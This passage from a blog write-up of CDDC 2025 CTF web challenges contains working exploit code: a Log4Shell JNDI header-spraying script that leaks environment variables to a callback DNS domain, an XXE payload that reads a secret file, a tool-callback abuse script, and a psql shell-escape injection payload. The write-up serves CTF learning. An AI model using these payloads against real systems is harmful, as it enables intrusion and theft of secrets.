class="subst">&#123;env_var&#125;</span> via <span class="subst">&#123;header_name&#125;</span> (Status: <span class="subst">&#123;response.status_code&#125;</span>)&quot;</span>)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [-] Error with <span class="subst">&#123;header_name&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Small delay between requests</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Longer delay between header tests</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Quick test of a few headers with a simple callback</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Quick test of most promising headers...&quot;</span>)</span><br><span class="line">    promising_headers = [<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;X-Forwarded-For&quot;</span>, <span class="string">&quot;Referer&quot;</span>, <span class="string">&quot;X-Api-Version&quot;</span>, <span class="string">&quot;Authorization&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> header_name <span class="keyword">in</span> promising_headers:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [*] Quick test via <span class="subst">&#123;header_name&#125;</span>&quot;</span>)</span><br><span class="line">        simple_payload = <span class="string">f&quot;$&#123;&#123;jndi:ldap://quicktest-<span class="subst">&#123;header_name.lower().replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#x27;</span>)&#125;</span>.<span class="subst">&#123;dns_domain&#125;</span>/test&#125;&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        headers[header_name] = simple_payload</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(target_url, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [+] Quick test sent via <span class="subst">&#123;header_name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Try basic JNDI callback to confirm vulnerability on different headers</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Testing basic connectivity on all headers...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> header_name <span class="keyword">in</span> vulnerable_headers:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [*] Testing basic callback via <span class="subst">&#123;header_name&#125;</span>&quot;</span>)</span><br><span class="line">        basic_payload = <span class="string">f&quot;$&#123;&#123;jndi:ldap://test-<span class="subst">&#123;header_name.lower().replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#x27;</span>)&#125;</span>.<span class="subst">&#123;dns_domain&#125;</span>/basic&#125;&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        headers[header_name] = basic_payload</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(target_url, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [+] Basic callback sent via <span class="subst">&#123;header_name&#125;</span> (Status: <span class="subst">&#123;response.status_code&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [-] Error with <span class="subst">&#123;header_name&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Exploitation attempts completed!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Monitor DNS queries to: <span class="subst">&#123;dns_domain&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Look for DNS requests with environment variable values as subdomains&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    target_url = <span class="string">&quot;???&quot;</span></span><br><span class="line">    dns_subdomain = <span class="string">&quot;???&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Log4Shell CTF Exploitation Script&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exploit_log4shell(target_url, dns_subdomain)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[-] Exploitation interrupted by user&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

</details>

<h2 id="ONVIF"><a href="#ONVIF" class="headerlink" title="ONVIF"></a>ONVIF</h2><p>We’re given an ONVIF camera API from which we can pull device information - <code>http://???/onvif/device_service</code>. Interacting with this endpoint using SOAP requests to <code>GetDeviceInformation</code> gives us the following:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Device Information:</span><br><span class="line">  manufacturer: BlindNVR</span><br><span class="line">  model: Model-X</span><br><span class="line">  firmware: 1.0</span><br><span class="line">  serial: 0001</span><br><span class="line">  hardware_id: This endpoint is vulnerable to XXE. Try reading /secret using XML entity injection.</span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:SOAP-ENV</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">xmlns:trt</span>=<span class="string">&quot;http://www.onvif.org/ver10/media/wsdl&quot;</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">xmlns:tt</span>=<span class="string">&quot;http://www.onvif.org/ver10/schema&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">trt:GetProfilesResponse</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">trt:Profiles</span> <span class="attr">token</span>=<span class="string">&quot;profile_1&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">tt:Name</span>&gt;</span>MainStream<span class="tag">&lt;/<span class="name">tt:Name</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">tt:VideoSourceConfiguration</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">tt:Name</span>&gt;</span>VideoSourceConfig<span class="tag">&lt;/<span class="name">tt:Name</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">tt:VideoSourceConfiguration</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">trt:Profiles</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">trt:GetProfilesResponse</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>We can retrieve the contents of <code>/secret</code> by sending a simple XXE payload, inserting <code>&amp;xxe;</code> directly into the existing <code>tds:HardwareId</code> field so it gets reflected back to us.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://???/onvif/device_service&quot;</span></span><br><span class="line"></span><br><span class="line">envelope = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="string">  &lt;!ENTITY xxe SYSTEM &quot;file:///secret&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope xmlns:s=&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span></span><br><span class="line"><span class="string">            xmlns:tds=&quot;http://www.onvif.org/ver10/device/wsdl&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">    &lt;tds:GetDeviceInformation&gt;</span></span><br><span class="line"><span class="string">      &lt;tds:HardwareId&gt;&amp;xxe;&lt;/tds:HardwareId&gt;</span></span><br><span class="line"><span class="string">    &lt;/tds:GetDeviceInformation&gt;</span></span><br><span class="line"><span class="string">  &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/soap+xml; charset=utf-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SOAPAction&#x27;</span>: <span class="string">&#x27;http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=envelope, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>We get this response:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:SOAP-ENV</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">xmlns:tds</span>=<span class="string">&quot;http://www.onvif.org/ver10/device/wsdl&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tds:GetDeviceInformationResponse</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">tds:Manufacturer</span>&gt;</span>BlindNVR<span class="tag">&lt;/<span class="name">tds:Manufacturer</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">tds:Model</span>&gt;</span>Model-X<span class="tag">&lt;/<span class="name">tds:Model</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">tds:FirmwareVersion</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tds:FirmwareVersion</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">tds:SerialNumber</span>&gt;</span>0001<span class="tag">&lt;/<span class="name">tds:SerialNumber</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">tds:HardwareId</span>&gt;</span>admin:V3ryV3ryStr0ngP4$$</span><br><span class="line"><span class="tag">&lt;/<span class="name">tds:HardwareId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tds:GetDeviceInformationResponse</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>We can access the stream using the credentials <code>admin:V3ryV3ryStr0ngP4$$</code> to get the flag.</p>
<h2 id="MCP-Mesh"><a href="#MCP-Mesh" class="headerlink" title="MCP Mesh"></a>MCP Mesh</h2><p>I don’t know how this is related to MCP in any way. Idea is to use utils to call the admin function instead of doing it directly, but the challenge isn’t very well implemented and doesn’t make a lot of contextual sense.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://???/api/query&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">session.post(BASE_URL, json=&#123;</span><br><span class="line">    <span class="string">&quot;server&quot;</span>: <span class="string">&quot;utils&quot;</span>,</span><br><span class="line">    <span class="string">&quot;command&quot;</span>: <span class="string">&quot;register_callback&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tool_name&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;callback&quot;</span>: json.dumps(&#123;<span class="string">&quot;server&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;command&quot;</span>: <span class="string">&quot;get_flag&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">session.post(BASE_URL, json=&#123;</span><br><span class="line">    <span class="string">&quot;server&quot;</span>: <span class="string">&quot;utils&quot;</span>,</span><br><span class="line">    <span class="string">&quot;custom_tool&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">resp = session.post(BASE_URL, json=&#123;</span><br><span class="line">    <span class="string">&quot;server&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;custom_tool&quot;</span>: <span class="string">&quot;get_flag&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

<h2 id="Clever-Injection"><a href="#Clever-Injection" class="headerlink" title="Clever Injection"></a>Clever Injection</h2><p>We’re given a server with a command injection sink, where we can control the contents of tmpfile:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$raw_payload</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$escaped</span> = <span class="title function_ invoke__">pg_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$raw_payload</span>);</span><br><span class="line"><span class="variable">$quoted</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="variable">$escaped</span> . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO test (id) VALUES (<span class="subst">$quoted</span>);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmpfile</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;sql_&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$tmpfile</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PGPASSWORD=<span class="subst">$password</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">    <span class="string">&#x27;psql -U %s -d %s -h %s -t -A -e -f %s 2&gt;&amp;1&#x27;</span>,</span><br><span class="line">    <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$user</span>),</span><br><span class="line">    <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dbname</span>),</span><br><span class="line">    <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>),</span><br><span class="line">    <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$tmpfile</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>Looking at <a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/current/app-psql.html">the postgres docs</a>, we’re able to escape to a sub-shell using <code>\!</code>, but our input is being passed through a sanitiser <code>pg_escape_string</code>. Looking for recent bypasses gives us <a target="_blank" rel="noopener" href="https://theendof.substack.com/p/hidden-messages-in-emojis-and-hacking">this blog post</a> involving encoding length confusion to leave single quotes unsanitised. Our payload is therefore:</p>
<p><code>test%C0%27&#39;);%0A\!%20cat%20/tmp/flag%0A--</code></p>
<h1 id="Rant-session-2"><a href="#Rant-session-2" class="headerlink" title="Rant session 2"></a>Rant session 2</h1><p>As you can see there were a lot of CVE challenges this year. This is fine, but at some point it starts becoming an exercise in Google searching. It doesn’t help when the challenges that aren’t based on CVEs don’t make a lot of sense (cue deepblue, shattered maze, MCP), and aren’t well-grounded in any legitimate technology or vulnerability. Suffice to say, I wasn’t inspired by any of the web challenges.</p>
<p>The take-home assignment format is really, really bad for the sanity of teams who are part of the struggle for the podium. Plenty of us had very little to no sleep, with all of us worried that other teams in the running would solve some challenges overnight, leaving us trailing behind in the morning. I’m sure every other team thought the same as well, and it became a self-sufficient slog-fest leaving everyone dragging their feet into the venue on Thursday.</p>
<p>To illustrate my point, I’ll end this section off with a look into the devolution of our sanity that night.</p>
<p><img src="/2025/06/14/cddc-2025/1.png" alt="1"><br><img src="/2025/06/14/cddc-2025/2.png" alt="2"><br><img src="/2025/06/14/cddc-2025/3.png" alt="3"><br><img src="/2025/06/14/cddc-2025/4.png" alt="4"></p>
<p>Thanks for reading. Close the door on your way out.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://Iscaraca.github.io">Iscara</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://iscaraca.github.io/2025/06/14/cddc-2025/">http://iscaraca.github.io/2025/06/14/cddc-2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/05/31/cobblestone-generator/" title="I Want To Build A Cobblestone Generator [WIP]"><img class="cover" src="/2025/05/31/cobblestone-generator/cobblestone-generator.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">I Want To Build A Cobblestone Generator [WIP]</div></div><div class="info-2"><div class="info-item-1">I want to build cobblestone generators on ALL my skyblock world islands, so that an unlimited supply of my favourite block is always a stone’s throw away! I can never remember where the water and lava go though… mind helping me out? Here’s a quick tutorial I pulled up for your reference: Have fun, and thanks for the help! Island 1:Solve on Penpa (answer checking enabled) Island 2:Solve on Penpa (answer checking enabled) </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/04/21/greyctf-2024/" title="GreyCTF 2024 Writeups"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-21</div><div class="info-item-2">GreyCTF 2024 Writeups</div></div><div class="info-2"><div class="info-item-1">I participated under team youtiaos and we ended 1st place local.  I was solving in the web and misc categories. The specific challenges I solved are in the image below.  I’ll update this writeup with the flags once the challenges are back up. Web ChallengesBaby WebThe website uses Flask session cookies but the secret key is given unchanged in the source code. Sign another cookie with is_admin=True and proceed to spend 10 minutes finding for a hidden element on the admin page to get the flag....</div></div></div></a><a class="pagination-related" href="/2024/03/15/htb-2024/" title="HTB Cyber Apocalypse CTF 2024 Web Writeups"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-15</div><div class="info-item-2">HTB Cyber Apocalypse CTF 2024 Web Writeups</div></div><div class="info-2"><div class="info-item-1">This CTF happened during my midterms and I didn’t really have the luxury of time to look at some of the later challenges. I participated under team youtiaos, and we ended 97th place out of 5694 teams. Lightning RoundTimeKORP - Trivial command injection in format parameterKORP terminal - SQLmap + bcrypt hash cracking Labyrinth LinguistWe’re given a Java application using the Apache Velocity templating engine. We have user controlled input via textString that we can inject Velocity templates...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Iscara</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Iscaraca" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/isaaccjd/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin-in" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Rant-session-1"><span class="toc-number">1.</span> <span class="toc-text">Rant session 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Writeups"><span class="toc-number">2.</span> <span class="toc-text">Writeups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-Request-Smuggling"><span class="toc-number">2.1.</span> <span class="toc-text">HTTP Request Smuggling</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Logshell"><span class="toc-number">2.2.</span> <span class="toc-text">Logshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ONVIF"><span class="toc-number">2.3.</span> <span class="toc-text">ONVIF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MCP-Mesh"><span class="toc-number">2.4.</span> <span class="toc-text">MCP Mesh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Clever-Injection"><span class="toc-number">2.5.</span> <span class="toc-text">Clever Injection</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rant-session-2"><span class="toc-number">3.</span> <span class="toc-text">Rant session 2</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-color: #0e1111;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Iscara</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="What are you looking for?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>